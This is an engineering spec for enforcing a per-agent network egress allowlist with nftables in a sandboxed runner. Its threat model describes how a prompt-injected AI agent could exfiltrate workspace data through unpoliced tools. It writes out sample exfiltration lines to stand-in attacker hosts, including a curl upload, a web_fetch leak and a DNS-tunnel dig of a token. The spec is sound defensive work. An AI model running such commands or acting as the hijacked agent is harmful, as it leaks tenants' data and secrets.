# M84_004: Runner egress allowlist (launch slice) — Phase-2 nftables enforcement of the per-zombie NetworkPolicy

**Prototype:** v2.0.0
**Milestone:** M84
**Workstream:** 004
**Date:** Jun 05, 2026 (re-scoped to the launch slice Jun 10, 2026 after a code-grounded adversarial review)
**Status:** DONE (launch-slice scope; moved to `done/` per Indy, Jun 12, 2026) — foundation + the egress **policy abstraction** merged to `main`; the strict (kernel-enforced) implementation behind it lands in 2.0.1 (Indy, Jun 11, 2026). `RUNNER_NETWORK_POLICY` now selects between two egress implementations; see the status map + the validated option-D recipe in Discovery.
> **Policy abstraction merged; strict enforcement in 2.0.1 (Indy, Jun 11, 2026).** Indy: _"its abstraction for me... keep the strict implement (not fully done invoked) when i turn on the option"_ + _"i want the default to be allow_all."_ `RUNNER_NETWORK_POLICY` selects, with **operator-legible names** (each says what it does): `allow_all` (**DEFAULT** — unset resolves here; re-shares host netns via `--share-net` = everything outbound allowed; the unenforced interim) · `deny_all_egress` (no outbound traffic) · `allow_list_egress` (**opt-in** kernel-enforced option-D path — outbound only to permitted destinations; **fails closed `UZ-RUN-007`** until `establishEgress` is wired in 2.0.1). **⚠️ Security posture:** this is **open-by-default** (`allow_all`) — the accepted pre-enforcement interim; flip the default to `allow_list_egress` when 2.0.1 lands. Env-configured (no config file — Indy: env is fine).
**Priority:** **P1 — launch-critical security boundary (re-classified Jun 10, 2026; threat model corrected Jun 10 against code).** Closes the **day-1** exfiltration path M84_003 leaves open *on trusted runners*: the network-enabled tier shares the host network namespace with no egress restriction, and the per-zombie allowlist is honored by **only** the `http_request` tool — `web_fetch` is allow-all (`allowed_domains = &.{}`) and `bash` is `policy = null`. A prompt-injected agent uses those unpoliced tools to exfiltrate the **workspace data it is handling** (cloned private repo, fetched files, issue/PR text) to any host and to weaponize the box against third parties. The tenant's secret **values** are better protected — materialized only inside `http_request` (substitution + L7 allowlist + redaction), so the unpoliced tools cannot route them — leaving the secret-value residual to an *allowed write-capable host* (§4.1), which scoped/short-lived tokens (still unbuilt: `secrets_resolve.zig:48` verbatim, no Time-To-Live; `docs/AUTH.md:204` static long-lived) must close, not this slice.
**Categories:** API
**Batch:** B1 — standalone; rides M84_003's `appendBwrap` argv + the `test-integration-runner` lane (both merged, #370).
**Branch:** feat/m84-runner-egress-allowlist
**Test Baseline:** unit=1857 integration=161 — reconstructed from the `origin/main` branch point (`make _lint_zig_test_depth` counter); spec predates the Test Delta rule (dotfiles `71840a7`, Jun 10, 2026).
**Depends on:** **M84_003 — DONE (merged #370).** M84_003 stopped the *daemon's* `ZOMBIE_RUNNER_TOKEN` getting *in* (filtered `environ_map`); this slice stops the *tenant's own* secrets getting *out*. They share the `appendBwrap` / network-policy surface; M84_003 has landed, so there is no rebase wait.
**Provenance:** agent-surfaced in the Orly Chief Technology Officer (CTO) adverse review of M84_003 (Jun 05, 2026); **re-scoped to a launch pull-forward in the Jun 10, 2026 adversarial review** (three-agent, code-grounded against `main`) which refuted the deferral — the stated compensating control is unbuilt and the exfil is trivially exploitable on a trusted runner day-1.

> **Provenance is load-bearing.** Every claim was verified by reading `network.zig`, `runner_network_policy.zig`, `sandbox_args.zig`, `src/lib/contract/execution_policy.zig` (`NetworkPolicy`), `src/zombied/zombie/yaml_frontmatter.zig` (TRIGGER.md `network.allow` parse), `tool_bridge.zig`, `tool_builders.zig`, `secrets_resolve.zig`, `protocol_test.zig`, `docs/SKILL_FRONTMATTER_SCHEMA.md`, and `docs/AUTH.md` under an adversarial lens. Re-confirm at PLAN.

**Canonical architecture:** [`docs/architecture/runner_fleet.md`](../../architecture/runner_fleet.md) §Sandbox tiers / §Egress model and [`docs/architecture/data_flow.md`](../../architecture/data_flow.md) (the "never escapes the sandbox" guarantee). This workstream makes the egress half of that guarantee true for the network-enabled tier.

---

> **LAUNCH SLICE — pulled forward (adversarial review + Indy, Jun 10, 2026).** This spec was originally deferred *whole* behind untrusted-runner General Availability (GA), on the theory that $-capped keys + least-privilege tool secrets bound the exfil risk at launch. A code-grounded adversarial review (Jun 10) refuted that on every count:
> 1. **The network-enabled `registry_allowlist` tier — which prod baremetal explicitly sets (`RUNNER_NETWORK_POLICY=registry_allowlist`, `deploy/baremetal/zombie-runner.service:38`) — emits `--share-net`** (after `sandbox_args.zig:126`'s `--unshare-all`; `network.zig:73`), so the child shares the host network namespace with **zero** egress filter (`runner_network_policy.zig` — the allowlist is "logged for observability only; TCP-layer restriction is **Phase 2 (nftables)**"). *(The code default is `deny_all` — no network at all.)*
> 2. **The per-zombie allowlist is honored by only the `http_request` tool.** `web_fetch` is built with `allowed_domains = &.{}` — NullClaw treats empty as **allow-all** (`web_fetch.zig:24`/`:66`) — `bash` is built `.policy = null` (`tool_builders.zig` `buildShell`), and `web_search`/`git` carry no egress policy either. So a hijacked agent runs `web_fetch(https://attacker/?leak=…)` or `bash: curl --data @/workspace/<file> https://attacker` to exfiltrate the **workspace data it is handling** to any host, and to scan/flood third parties. *(Secret **values** are not reachable this way — point 3.)*
> 3. **Secret *values* are well-protected; their one residual channel needs an unbuilt control.** The value is materialized only inside `http_request` (`secret_substitution.zig`, post-sandbox boundary), L7-allowlist-checked, and redacted from frames — the agent never sees it and `bash`/`web_fetch` cannot route it (no substitution outside `http_request`; `git` has no creds wired, `buildGit`). The residual: with github.com in the allowlist (platform-ops needs it), the agent POSTs `${secrets.github.token}` to an attacker-controlled gist *on the allowed host*. The **egress allowlist does not close that** — scoped/short-lived tokens do, and they are vaporware (`secrets_resolve.zig:48` reads vault creds verbatim, no Time-To-Live/scoping; lease carries the raw secret inline, `protocol_test.zig:239`; `docs/AUTH.md:204` static long-lived). The $-cap bounds LLM *spend*, not a leaked `ghp_` token's blast radius (repo/org write, unrevocable by usezombie). → §4.1.
>
> **Indy decision (verbatim, Jun 10, 2026):** _"I want to go with 1"_ — option 1 = pull the **host-side nftables IP-allowlist** slice forward for launch; defer the Layer-7 (L7) DNS-pinning proxy to untrusted-runner GA.
>
> **This spec ships in two slices:**
> - **Launch Slice (ship now — this PR):** §1 own-netns (drop `--share-net`) + §2 in-netns **nftables IP-allowlist** (default-deny; allow only the resolved IPs of the **per-zombie `NetworkPolicy`** — TRIGGER.md `network.allow` + the 8 `REGISTRY_ALLOWLIST` baseline hosts + the inference endpoint) + §3 parent-owned (it is the existing lease-carried `NetworkPolicy`, not a new parse). Closes **arbitrary-host** exfil — the wide-open `curl $secret → anywhere` case, ~the entire practical attack surface. Rides M84_003's bwrap/lane work.
> - **Deferred to untrusted-runner GA (§5 — do NOT build for launch):** the L7 DNS-pinning forward proxy (name-based Server-Name-Indication (SNI) / `CONNECT` allowlisting for rotating Content Delivery Networks (CDNs), DNS-rebinding pin, encrypted-SNI / DNS-over-HTTPS default-deny). It is the refinement the *untrusted* tier needs when the operator's host list cannot be trusted and CDN IP sets churn; the trusted launch allowlist (inference + 8 registries) is small and stable, so resolve-to-IP-at-setup suffices.
>
> **Honest residual (does NOT close at launch — say so out loud):** an allow-listed write-capable host (github.com, which the agent legitimately needs) remains an exfil channel by design. Only short-lived / scoped tokens — a credential-model change, **NOT** this spec — close that last sliver. (A second classic channel — **DNS tunnelling** through a forwarding resolver — is *closed* by this slice via parent-only resolution, §3.3, not left as a residual.) This slice shrinks the blast radius from **"the entire internet"** to **"a handful of known hosts."**

## Implementing agent — read these first

1. `src/runner/engine/network.zig` — `PolicyMode` (`deny_all` / `registry_allowlist`) and `appendNetworkArgs`; today `registry_allowlist` emits `--share-net` and only `log.debug`s the allowlist (lines ~68-76). This surface changes from "share host netns + log" to "own netns + host-side nftables IP-allowlist".
2. `src/runner/engine/runner_network_policy.zig` — `REGISTRY_ALLOWLIST` (the registry **baseline**, lines ~13-22), **already merged per-zombie with `config.network.allow`** (M2_001/M3_001). Its own header names the gap this workstream closes: *"logged for observability only — TCP-layer restriction is **Phase 2 (nftables)**."* This spec **is** that Phase 2 — it enforces the existing merged allowlist; it does not invent a new one.
3. `src/runner/sandbox_args.zig` — `appendBwrap`; where `--unshare-all` / `--share-net` are decided. The child must keep an **unshared** net namespace on every sandboxed tier, with a veth pair as its only route to the nftables-filtered host hop.
4. `src/lib/contract/execution_policy.zig` — `NetworkPolicy` is the **per-execution egress allowlist** ("invariant for its lifetime", deny-all default) **already carried to the runner per-lease**, sourced from the zombie's TRIGGER.md `x-usezombie.network.allow` (parsed at `src/zombied/zombie/yaml_frontmatter.zig`). **This is the allowlist to resolve → IPs and install in nftables — there is no new `allow_hosts` parse.**
5. `src/runner/engine/runner.zig` §memory + `build_runner.zig` (`.engines = "base,sqlite"`) — proof the child holds **no** database credential and makes **no** datastore connection (Invariant 3); durable memory is the control plane's job over HTTPS.
6. `dispatch/write_zig.md` — all `*.zig` edits.

---

## PR Intent & comprehension handshake

- **PR title (eventual):** `feat(m84): runner egress allowlist (launch slice) — own-netns + host-side nftables IP allowlist`
- **Intent (one sentence):** A prompt-injected sandboxed agent can `connect()` only to the IPs the zombie's `NetworkPolicy` resolves to (TRIGGER.md `network.allow` + the `REGISTRY_ALLOWLIST` baseline + the inference endpoint/gateway); every other destination — arbitrary exfil targets, raw IPs, link-local, the host LAN — is dropped by **nftables in the child's own network namespace**, not merely logged.
- **Handshake (agent fills at PLAN, before EXECUTE):** restate intent; list `ASSUMPTIONS I'M MAKING:`. **Confirm the enforcement point** (own-netns + host-side nftables IP-allowlist) and that the resolved IP set includes the configured inference endpoint(s)/gateway — a too-tight set silently breaks every lease (the agent cannot reach its Large Language Model (LLM)); a too-loose one re-opens exfil. **Confirm the IP-resolution moment** (parent resolves the lease's `NetworkPolicy` hostnames → IP set at lease setup; `NetworkPolicy` is session-fixed so the child never resolves or widens it).

---

## Applicable Rules

- **`docs/greptile-learnings/RULES.md`**:
  - **RULE UFS** — the allowlist seed (`REGISTRY_ALLOWLIST`), the nftables table/chain names, the veth/subnet constants, and any bwrap net flags are single-sourced named constants, reused by builder + tests — never re-spelled.
  - **RULE NLG** — pre-2.0: the `--share-net` behaviour is **replaced**, not shimmed; no "legacy network mode" framing.
  - **RULE NDC / NLR** — no dead code; the log-only `log.debug("allowlist_host", …)` line is removed when enforcement lands (it becomes real), not left beside the new path.
- **`dispatch/write_zig.md`** — tagged-union results, `errdefer`, cross-compile both linux targets.
- **`docs/AUTH.md`** — the inference `api_key` and tool secrets cross into the child on the lease; this workstream constrains where the child can *send* them, and must not change how they are delivered.
- **`docs/LOGGING_STANDARD.md`** — any `egress_denied` / `egress_allowed` emit follows the logfmt envelope; never log a secret or a full URL with query; host/IP only.

## Applicable Gates

| Gate | Fires? | Satisfaction strategy |
|------|--------|-----------------------|
| ZIG GATE | **yes** — `*.zig` edits | Read `dispatch/write_zig.md`; cross-compile both linux targets. |
| UFS | **yes** — allowlist seed + nftables table/chain + veth constants | Named constants in `network.zig` / `runner_network_policy.zig`, reused in tests. |
| LENGTH (≤350/≤50/≤70) | **maybe** — `network.zig` grows (netns + veth + nft emit) | Extract a netns/nftables emit helper so `appendNetworkArgs` stays ≤50 lines. |
| LOGGING | **yes** — new egress-decision emit | Envelope unchanged; host/IP only, never the secret or full URL. |
| LIFECYCLE | **maybe** — netns / veth / nft handle ownership | The veth + nft ruleset are torn down with the lease's netns; `errdefer`-clean on the setup path. **No per-lease proxy process** to own (one reason the IP-allowlist slice is simpler than the deferred proxy). |
| SCHEMA / ERROR REGISTRY | **maybe ERROR REGISTRY** — a distinct `egress unavailable` failure class | If the lease fails closed when the netns/nft setup fails, register/reuse the sandbox-establish failure code; no schema. |

---

## Overview

**Goal (testable):** On a network-enabled sandboxed tier, the child runs in its **own** network namespace and can `connect()` only to the IPs the operator's allowlist resolves to (inference endpoint/gateway + registry seed + declared `allow_hosts`); a `connect()` to any other IP — `attacker.example`'s address, a raw arbitrary IP, link-local, the host LAN — is **dropped by host-side nftables on the veth** (host netns, root-owned — Invariant 6), proven by a negative test, while a legitimate LLM call and an allowed-host tool call still succeed.

**Problem:** The only network-enabled tier (`registry_allowlist`) emits bubblewrap `--share-net` — the child **joins the host network namespace** — and the allowlist is **log-only** (`network.zig:68-76`, `runner_network_policy.zig:5-9`). So a sandboxed agent has **full host egress**. The per-zombie allowlist is honored by **only** the `http_request` tool; `web_fetch` is allow-all (`allowed_domains = &.{}`) and `bash` is `policy = null`, so a prompt injection (platform-ops agents read untrusted issue/PR text by design) uses those unpoliced tools to exfiltrate the **workspace data the agent is handling** (cloned private repo, fetched files, the issue/PR text under triage) to any host, and to weaponize the box. The tenant's secret **values** (inference `api_key`, tool tokens, delivered inline on the lease, `protocol_test.zig:239`) are materialized only inside `http_request` (substitution + L7 allowlist + redaction) and are *not* reachable through the unpoliced tools — their residual is exfil via an *allowed* write-capable host (§4.1). M84_003's `environ_map` removed only the *daemon's* token; the tenant's **data egress path** is untouched. **The per-zombie allowlist already exists and rides the lease** — TRIGGER.md `network.allow` → `NetworkPolicy` (`execution_policy.zig`) → merged with `REGISTRY_ALLOWLIST` (M2_001/M3_001) — but it is **only logged, not enforced** (Phase 1: `--share-net` + `log.debug`). The plumbing is built; the kernel enforcement is the gap this workstream fills.

**Solution summary (launch slice):** Stop sharing the host network namespace. The sandboxed child keeps an **unshared** net namespace connected to the host by one veth pair, and the parent installs **default-deny nftables rules in the host netns, on the host-side veth** (root-owned, Invariant 6 — never inside the child's netns) that permit egress only to the **IP set resolved at lease setup from the per-zombie `NetworkPolicy`** (TRIGGER.md `network.allow` ∪ `REGISTRY_ALLOWLIST` baseline ∪ inference endpoint — the set already merged per M2_001/M3_001 and carried on the lease). Everything else is dropped at the kernel. The zombie's declared `network.allow` — which the schema already calls *"a kernel-level egress rule, rejected at packet time"* — becomes that real kernel boundary instead of a log line. Legitimate inference and allowed-host tool traffic are unchanged; arbitrary exfil and lateral reach are removed. The L7 *name*-based proxy (for rotating-CDN allowlists on the untrusted tier) is **deferred to §5**.

**Prioritization.** This is the **#1 residual risk for the real deployment** after M84_003: on a baremetal outbound-only node there is no metadata endpoint and no co-located datastore to attack, so lateral movement is moot — the surviving threat is **outbound exfiltration of the tenant's workspace data (and box-abuse)** via the unpoliced tools (`web_fetch` allow-all, `bash` no-policy), and the launch slice closes the arbitrary-host half cheaply by making the allowlist apply to **every** tool at the kernel. (Secret *values* are largely protected by substitution + L7 + redaction; their residual is the allowed write-capable host, §4.1.)

---

## Prior-Art / Reference Implementations

- **Untrusted-code egress firewall pattern (IP layer)** — give the workload its own network namespace with no default route except a veth to the host, and install nftables drop-all-except rules for the resolved allowlist IPs. This is the L3/L4 enforcement the launch tier needs for a small, stable host set. (The L7 SNI/`CONNECT` proxy — old §2 — is the name-layer refinement deferred to §5.)
- **Resolve-at-setup IP pinning** — the parent resolves each allowed name to its current IP(s) at lease setup and pins the nft set for the lease's lifetime; this is the trusted-tier analogue of DNS-pinning without a proxy. Its limitation (rotating CDN IPs mid-lease) is bounded for the small launch set and noted in Failure Modes.
- **`REGISTRY_ALLOWLIST`** (`runner_network_policy.zig`) — the existing host list is the enforced-set seed; do not re-spell it.

---

## Files Changed (blast radius)

| File | Action | Why |
|------|--------|-----|
| **`src/runner/network/` (NEW dir)** | CREATE | File-as-struct (`@This()`) modules, std-inspired (facade like `std.net`): `Allowlist.zig` (merged egress allowlist — **operator-fed** registry ∪ `network.allow` ∪ inference host; single source for L4+L7), `Plan.zig` (veth params + `/etc/hosts`/`resolv.conf` render), `MessageBuilder.zig` + `rtnetlink.zig` + `nfnetlink.zig` (pure netlink serializers — golden-byte tested), `Socket.zig` (`AF_NETLINK`, Linux-gated), `EgressScope.zig` (lifecycle `create`/`attachChild`/`destroy`, mirrors `engine/cgroup.zig`), `Policy.zig` (`Mode` + env parse), `network.zig` (facade). All addresses use `std.Io.net.IpAddress`. |
| `src/runner/engine/network.zig` + `engine/runner_network_policy.zig` | DELETE (migrate) | Fold into `network/Policy.zig` + `network/Allowlist.zig` (RULE NLR/NLG — move, don't shim). The dead `mergeAllowlists` + the log-only `--share-net` path go; importers (`sandbox_args`, `daemon/config`) repoint to `network`. |
| `src/runner/sandbox_args.zig` | EDIT | No `--share-net` on any tier (child stays `--unshare-all`); `--ro-bind` the per-lease `/etc/hosts` + neutered `/etc/resolv.conf` (paths from `Plan`). |
| `src/runner/daemon/config.zig` | EDIT | Parse `RUNNER_REGISTRY_ALLOWLIST` (comma-separated) at load → `registry_allowlist: []const []const u8`, fed into `Allowlist.build` — the registry baseline is **operator-configurable, fed from outside, not a compile-time constant** (a named default is fallback only). |
| `src/runner/child_supervisor.zig` + a `__netns_launch` runner sub-mode | EDIT (option D — validated Jun 11, see Discovery) | `establishEgress()`: resolve allowlist → `EgressScope.create` builds a **named netns** (`/run/netns/uz-N`) + veth (peer moved in **by netns fd**, not pid) + nft + rendered `/etc/hosts`/`resolv.conf`; then plain `std.process.spawn` (hardened boundary kept) launches `__netns_launch` which `setns(/run/netns/uz-N)` + `execve(bwrap --unshare-all --share-net -- runner __execute)`; `defer EgressScope.destroy()` (teardown veth + nft + `ip netns del`-equiv). Fail-closed to **`UZ-RUN-007`** at this boundary. **No custom fork; `EgressScope.attachChild(pid)` is dropped** (the child joins the pre-made named netns, the parent never needs the child pid). |
| `src/runner/engine/tool_builders.zig` | EDIT | `http_request`/`web_fetch`/`web_search` consume the same merged `Allowlist` (L7 legibility); closes the `allowed_domains = &.{}` allow-all + the L4/L7 split-brain. |
| `src/lib/contract/execution_policy.zig` (`NetworkPolicy`) | READ (no new parse) | The per-zombie allowlist is **already carried** here (TRIGGER.md `network.allow`, merged per M2_001/M3_001). The new work **resolves** its hostnames → an IP set at lease setup and hands it to the nftables installer — no new `allow_hosts` parsing. |
| `src/lib/contract/execution_policy.zig` (`ExecutionPolicy`) + `src/zombied/fleet/service.zig` | EDIT (control-plane) | The control plane authors the **resolved inference endpoint host** onto the lease (it already resolves the provider in `tenant_provider_resolver`), so the parent allowlists exactly the host the engine dials — no child-side URL-derivation drift (Dim 3.1). |
| `ExecutionResult.blocked_egress` + per-lease DNS stub | DEFERRED follow-up | Structured, parent-owned author-facing denial chip — needs a DNS stub to capture off-list query names. Launch uses best-effort fast-fail surfacing (Dim 3.4); build only if that proves thin. |
| `src/runner/network/*` in-file `test` blocks + `network/egress_scope_integration_test.zig` | CREATE | Std-style in-file tests: pure (`Allowlist`/`Plan`/builders — golden bytes, run on macOS); **Linux-only integration** (allowed IP reachable, denied dropped, link-local/private dropped, fail-closed, child-can't-`nft flush`, per-lease isolation, DNS fast-fail) on the `test-integration-runner` lane. Registered in `src/runner/tests.zig`. |
| `make/test-integration.mk` | EDIT | Register the egress integration tests on the `test-integration-runner` lane (created in M84_003). |
| `docs/architecture/runner_fleet.md` | EDIT (small) | Document the launch egress model (own-netns + nftables IP-allowlist) under §Sandbox tiers, and note the L7 proxy as the untrusted-GA follow-up. |

---

## Decomposition & alternatives (patch vs refactor)

- **Chosen shape (launch slice):** one atomic workstream (B1) — own-netns + host-side nftables IP-allowlist + parent config/resolution plumbing share the network path; separate tests. It is a **refactor of the network tier** (the `--share-net` model is replaced), behaviour-preserving for the legitimate inference/allowed-host path.
- **Mechanism (LOCKED — Indy, Jun 10, 2026): Phase-2 host-side nftables enforcement of the existing `NetworkPolicy`.** The parent resolves the per-zombie allowlist (TRIGGER.md `network.allow` ∪ `REGISTRY_ALLOWLIST` ∪ inference endpoint — already merged per M2_001/M3_001 and carried on the lease) → an IPv4/IPv6 set at lease setup, and installs `nft` drop-all-except rules in the **host netns on the host-side veth** (root-owned — Invariant 6; never in the child's netns). This is exactly the *"Phase 2 (nftables)"* the `runner_network_policy.zig` header already names — the allowlist is built and carried; only the kernel enforcement is new. Rationale: the launch allowlist is small and largely static, so resolve-at-setup pins it for the lease with no L7 machinery and no per-lease process.
- **Alternatives considered:**
  - **(a — DEFERRED to §5) L7 DNS-pinning forward proxy** — name-based SNI/`CONNECT` allowlisting; the correct layer for *names* on rotating CDNs and for forged-SNI / DNS-rebinding resistance. Heavier (a long-lived host proxy + SNI parsing + connect-IP pinning) and only required when the host set is large/rotating or operator-untrusted — i.e. the untrusted-runner tier. Deferred there.
  - **(b) Keep `--share-net`, add host-global firewall rules** — rejected: rules on a shared namespace mutate the *host's* networking and cannot be per-lease.
  - **(c) Force `deny_all` until enforcement exists** — rejected as the end state (the agent's LLM call needs egress); it remains the honest **interim** posture (Out of Scope / Failure Modes) only if this slice itself slips before launch.

---

## Sections (implementation slices)

### Build status — per Dimension

Legend: 🟢 **done** (built + tested) · 🟡 **to be implemented in 2.0.1** (via the option-D `establishEgress` recipe in Discovery).

| Dim | What | Status |
|---|---|---|
| **Foundation** | netlink layer (`MessageBuilder`/`rtnetlink`/`nfnetlink`/`nfnetlink_rule`/`AllowList`/`Plan`/`Socket`/`EgressScope`) — golden-byte tested vs real `nft`; `egress_integration_test.zig` proves create/attach/destroy on Linux | 🟢 |
| **Policy abstraction** | `RUNNER_NETWORK_POLICY` → `Policy.Mode` strategy, operator-legible names: `allow_all` (DEFAULT, everything outbound) / `deny_all_egress` (no outbound) / `allow_list_egress` (opt-in, outbound only to permitted dests; fail-closed until D); `sharesHostNet`/`enforcesEgress` helpers; sandbox_args + supervisor wired | 🟢 |
| **1.1** | strict posture keeps the netns unshared (no `--share-net`); interim re-shares it. The *strict* enforcement that makes own-netns meaningful = the 🟡 rows below | 🟢 (switch) / 🟡 (enforcement) |
| **1.2** | fail-closed when no rules installed | 🟡 |
| **2.1** | allowed IP reachable (behavioural test: listener + forwarding rig) | 🟡 |
| **2.2** | non-allowed IP dropped (packet-level allow/deny contrast) | 🟡 |
| **2.3** | link-local / RFC1918 dropped | 🟡 |
| **3.1** | inference host on the lease, control-plane authored (`ExecutionPolicy.inference_host` + zombied author + `hostFromUrl` + parse) | 🟢 |
| **3.1-enf** | inference host always *in the enforced set* / fail-closed if unresolvable | 🟡 |
| **3.2** | allowlist not child-extendable | 🟡 |
| **3.3** | DNS-tunnel closure — `Plan.resolvConf` + the two `:53` drop rules built+golden-tested; binding the files on a live lease | 🟡 |
| **3.4** | denial communicated to the user (fast-fail at resolution) | 🟡 |
| **4.1** | honest residual (write-capable allowed host) — documented, no code by design | 🟢 |
| **§5** | eBPF/FQDN name-layer (untrusted-GA) | 🟡 |

**2.0.1 resume:** build `establishEgress` via the validated option-D recipe (Discovery); the 🟡 Dimensions land + flip 🟢 as their behavioural tests pass. **Also required:** a **boot-time reconciliation sweep** — on runner startup, flush stale `uz_egress*` tables + `uzveth*` veths + `/run/netns/uz-*` (prefix match) left by a SIGKILL/crash, before establishing fresh per-lease egress (see Failure Modes: "Runner SIGKILL/crash + restart"). `defer destroy()` only covers graceful stop.

### §1 — The sandboxed child runs in its own network namespace (no `--share-net`)

The child must never join the host network namespace. On a network-enabled tier it keeps an **unshared** net namespace whose only route out is a veth pair to the host, gated by the §2 nftables rules; with no rules installed it has no egress at all (fail-closed). This removes the "full host egress" property at its root — direct connects to anywhere (host loopback, the host LAN, the wider internet) fail unless the destination IP is in the allowlist.

- **Dimension 1.1** — no sandboxed tier emits `--share-net`; the child's net namespace is unshared on `deny_all` AND the network-enabled tier → Test `test_no_share_net_on_any_sandboxed_tier`
- **Dimension 1.2** — with no allowlist rules installed (setup failure), the child has **no** egress (fail-closed, not fall-open to the host network) → Test `test_egress_fails_closed_without_rules`

### §2 — Default-deny host-side nftables IP-allowlist (the allowlist enforced)

The runner installs the nftables ruleset in the **host** network namespace, on the **host-side veth interface** (forward chain, `oifname "<veth-host>"`) — **NOT** inside the child's netns, which the child's user namespace owns and could `nft flush` (Invariant 6). Those host-side rules DROP all of the child's egress except to the resolved allowlist IPs (name resolution is **parent-provided** per §3.3 — no forwarding resolver is reachable from the child). The child's netns holds only its veth end + a default route to the host; the host LAN, link-local, and private ranges (except the veth subnet) are denied.

- **Dimension 2.1** — a connect to an allowed IP (the resolved inference endpoint) succeeds → Test `test_allowed_ip_reachable`
- **Dimension 2.2** — a connect to a non-allowed IP is dropped by nftables → Test `test_denied_ip_dropped` (+ `egress_denied` logged, IP only)
- **Dimension 2.3** — link-local (`169.254.0.0/16`), loopback-to-host, and RFC1918 private ranges (outside the veth subnet) are dropped — defense-in-depth even on baremetal where no metadata service exists → Test `test_link_local_and_private_denied`

### §3 — Per-zombie `NetworkPolicy` → resolved IP set (parent-owned)

The allowlist is the zombie's **already-carried** `NetworkPolicy` (`src/lib/contract/execution_policy.zig`) — sourced from TRIGGER.md `x-usezombie.network.allow`, merged with the `REGISTRY_ALLOWLIST` baseline per M2_001/M3_001, and always ∪ the configured inference endpoint(s)/gateway. The parent **resolves those names → IPs at lease setup** and installs the nft set. `NetworkPolicy` is "invariant for the session's lifetime" and parent-carried, so the child cannot widen it mid-run — Invariant 4 holds natively. (No new `allow_hosts` parse: the set already exists on the lease; this workstream resolves + enforces it.)

- **Dimension 3.1** — the resolved IP set always contains the configured inference endpoint/gateway. The **control plane authors the resolved inference host onto the lease** (`ExecutionPolicy` — it already resolves the provider in `tenant_provider_resolver`), so the parent allowlists *exactly* the host the engine will dial — no parent-side URL derivation that could drift from the engine's. A lease whose inference host is unresolvable fails closed at setup, not mid-run → Test `test_inference_host_always_allowed`
- **Dimension 3.2** — `allow_hosts` is a parent-only read; nothing in the child's environment or lease can extend the nft set → Test `test_allowlist_not_child_extendable`
- **Dimension 3.3 (DNS-tunnel closure)** — the child cannot reach a **forwarding** DNS resolver: name→IP resolution is parent-provided via a **static `/etc/hosts`** injected into the child (the allowlist names → their lease-setup-resolved IPs); **nftables drops ALL egress to port 53**, so no resolver — forwarding or otherwise — is reachable. DNS-tunnel exfil is closed by the *absence of any resolver* (nothing to misconfigure — the simplest possible closure). This **closes the DNS-tunnel exfil channel** — `dig $(echo $TOKEN | base64).attacker-ns.com @<resolver>` encodes the secret in the query name and reaches an attacker's authoritative nameserver *through* a forwarding resolver, which the IP-allowlist alone cannot see (the connect target is the *allowed* resolver IP). → Tests `test_no_forwarding_resolver_reachable` + `test_dns_tunnel_query_dropped`
- **Dimension 3.4 (author-facing denial — the end user learns *why* a host was blocked)** — a denied egress is **not silent**. A host the author forgot to declare misses the static `/etc/hosts` and, with port 53 dropped, fails **fast at resolution** (`could not resolve host: api.stripe.com` — no 30-second hang, no lease wall-clock burned on a dead socket); that hostname rides the tool's error output into the agent's turn, and the `http_request` tool additionally returns its **existing** structured L7 off-list error (`policy_http_request.zig`). This already kills the silent-timeout problem. The **structured, parent-owned `ExecutionResult.blocked_egress` field** — a guaranteed, tamper-proof *"blocked: api.stripe.com — add to network.allow"* chip on the run detail — **requires a per-lease DNS stub** (only a resolver process can capture an off-list query name) and is therefore **deferred to a fast follow-up**, built only if best-effort narration proves thin (Indy, Jun 10: keep launch simple). → Test `test_denied_named_host_fails_fast_at_resolution`

### §4 — Honest residual channels (no code; documented)

The allowlist caps the *blast radius*; it is not a complete exfil seal, and the spec says so out loud so operators do not over-trust it.

- **Dimension 4.1** — an allowed host that itself accepts attacker-readable writes (e.g. github.com for a platform-ops agent) is still an exfil channel **by design** — documented, with the real mitigation being short-lived / least-privilege tenant secrets (a separate credential-model change), not the network layer → recorded in Discovery + an operator note (no code).
- **DNS tunnelling — CLOSED by design (§3.3), not an accepted residual.** A forwarding resolver reachable from the child would let an agent smuggle secrets in DNS query names regardless of the IP-allowlist; §3.3 closes it (static `/etc/hosts` + **all** port-53 egress dropped — no resolver reachable at all). Called out here so a future maintainer does not silently re-open it by "just allowing port 53 to a resolver." The only standing residual is §4.1 (a write-capable allowed host).

### §5 — DEFERRED to untrusted-runner GA: eBPF/FQDN-aware name-layer (NOT a forward proxy)

> **Do NOT implement from this file for launch.** When usezombie commits to untrusted / customer-operated runners with **rotating-CDN host sets** the at-setup IP-pin cannot track, the name-layer is added the **modern** way: an **eBPF/FQDN-aware datapath** that learns allowed IPs by snooping DNS *answers* and programs the same `nftables`/kernel set live (the Cilium `toFQDNs` pattern, or a minimal DNS-answer watcher updating our existing set). **Explicitly NOT a forward proxy** — no SNI/`CONNECT` interception, no TLS man-in-the-middle (Indy, Jun 10: "I need modern practices, not an age-old DNS proxy"). It is a strict evolution of the launch datapath: pin-at-setup → pin-from-observed-DNS, same nft set; introducing a controlled resolver to snoop is itself the posture change gated to that tier. It becomes its own workstream at untrusted-GA scoping; the launch nft IP-allowlist (§1–§3) is the foundation it sits on.

---

## Interfaces

> **Illustrative — exact flags / nftables mechanism verified at PLAN.** Contract, not implementation.

```
# Network policy (the per-zombie NetworkPolicy, ALREADY carried on the lease — execution_policy.zig)
#   - PolicyMode stays { deny_all, <network_enabled> }; network_enabled NO LONGER means --share-net.
#   - allowlist = TRIGGER.md network.allow  ∪  REGISTRY_ALLOWLIST baseline  ∪  {inference endpoint/gateway}
#                 (already merged per M2_001/M3_001 — NOT a new operator allow_hosts parse).
#   - resolved at LEASE SETUP (parent) to an IP set; NetworkPolicy is session-fixed → child never widens it.
# Child network namespace (own, not shared):  veth-child <-> veth-host
# Egress enforcement — in the HOST netns, on the HOST-SIDE veth (root-owned, Invariant 6; NOT the child netns):
#   nft add rule inet filter forward oifname "<veth-host>" ... : default DROP, ACCEPT only resolved allowlist IPs.
#   name resolution is PARENT-PROVIDED: a static /etc/hosts (allowlist names -> setup-resolved IPs).
#   nftables DROPS ALL egress to port 53 -> NO resolver (forwarding or otherwise) is reachable (§3.3).
# Enforcement contract:
#   child connect(ip) succeeds  IFF  ip ∈ resolved-allowlist-IPs   (no port-53 path to a forwarding resolver)
#   else  -> dropped by nftables (logged: host/IP only, never secret/full-URL)
#   denied NAMED host (/etc/hosts miss, :53 dropped) -> fast resolution failure (no 30s hang); the name
#                          rides the tool error into the agent's output (structured blocked_egress -> follow-up)
#   no rules installed (setup failure) -> child has NO egress (fail-closed)
```

